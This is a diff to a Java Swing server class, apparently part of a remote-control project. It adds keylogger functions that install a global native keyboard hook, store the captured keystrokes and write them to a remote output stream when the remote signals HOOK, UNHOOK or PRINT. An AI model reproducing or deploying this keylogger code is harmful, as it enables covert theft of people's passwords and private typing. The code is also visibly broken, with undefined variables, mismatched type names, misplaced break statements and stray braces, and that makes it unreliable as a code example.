@@ -173,37 +173,83 @@ public class server extends javax.swing.JFrame {
      *
      * @param k
      */
-    public void hookKey(keylogger k){
-        try {
-        GlobalScreen.registerNativeHook();
-        } catch (NativeHookException ex) {
-        System.err.println("There was a problem registering the native hook.");
-        System.err.println(ex.getMessage());
-        System.exit(1);
-        }
-        GlobalScreen.addNativeKeyListener(k);
-    }
-    
-    public void unhook(){
-        
-    }
-    public void printkey(){
-        
-    }
-     public void keylog()
+    public void hookKey(Keylogger key){
+//        try {
+//            GlobalScreen.registerNativeHook();
+//        } catch (NativeHookException ex) {
+//            System.err.println("There was a problem registering the native hook.");
+//            System.err.println(ex.getMessage());
+//            System.exit(1);
+//        }
+//        GlobalScreen.addNativeKeyListener(k);
+
+
+        a++;
+        if(a==1)
         {
-            keylogger k=new keylogger();
-            boolean test = true;
-            while (test)
-            {
-                receiveSignal();
-                switch (program.signal)
-                {
-                   case "HOOK"->hookKey(k); 
-                   case "UNHOOK"->unhook();
-                   case "PRINT"->printkey();
+            try{
+                GlobalScreen.registerNativeHook();
+            }catch (NativeHookException evt){
+                evt.printStackTrace();
+            }
+            GlobalScreen.addNativeKeyListener(key);
+
+        } else{
+            if(a> b){
+                GlobalScreen.removeNativeKeyListener(key);
+            }
+
+            GlobalScreen.addNativeKeyListener(key);
+
+        }
+        }
+    }
+
+    public void unhook(Keylogger key) throws NativeMethodException {
+        b++;
+        GlobalScreen.removeNativeKeyListener(key);
+        k.store = "";
+    }
+    public void printkey(Keylogger key){
+        String s="";
+        try {
+            if(key == null){
+                program.ow.write("");
+                program.ow.newLine();
+                program.ow.flush();
+            }
+            else{
+                res = key.store;
+                if(res!= ""){
+                    program.ow.write(res);
+                    program.ow.newLine();
+                    program.ow.flush();
+                    key.store = "";
+                }
+                else {
+                    program.ow.write("");
+                    program.ow.newLine();
+                    program.ow.flush();
                 }
             }
+        } catch (IOException e){
+            e.printStackTrace();
+        }
+    }
+    public void keylog()throws IOException
+    {
+        keylogger key =new keylogger();
+        boolean flag = true;
+        while (test)
+        {
+            receiveSignal();
+            switch (program.signal)
+            {
+                case "HOOK"->hookKey(key);break;
+                case "UNHOOK"->unhook(key);break;
+                case "PRINT"->printkey(key);break;
+            }
+        }
 
     }
      public void application() throws IOException
